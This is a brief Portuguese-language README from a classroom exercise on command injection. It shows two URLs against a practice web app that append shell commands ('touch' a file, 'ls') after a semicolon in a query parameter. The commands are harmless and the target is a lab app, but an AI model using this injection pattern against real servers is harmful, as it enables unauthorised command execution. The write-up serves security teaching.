# Command Injection

Essa prática foi feita na sala de aula, consistia na injeção de comando para a criação de um arquivo com meu nome.

- Criando o arquivo no servidor:
```
http://commandinjection.herokuapp.com/?dir=folder;touch esdrasemanuel.txt
```
- Listando:
```
http://commandinjection.herokuapp.com/?dir=folder;ls
```
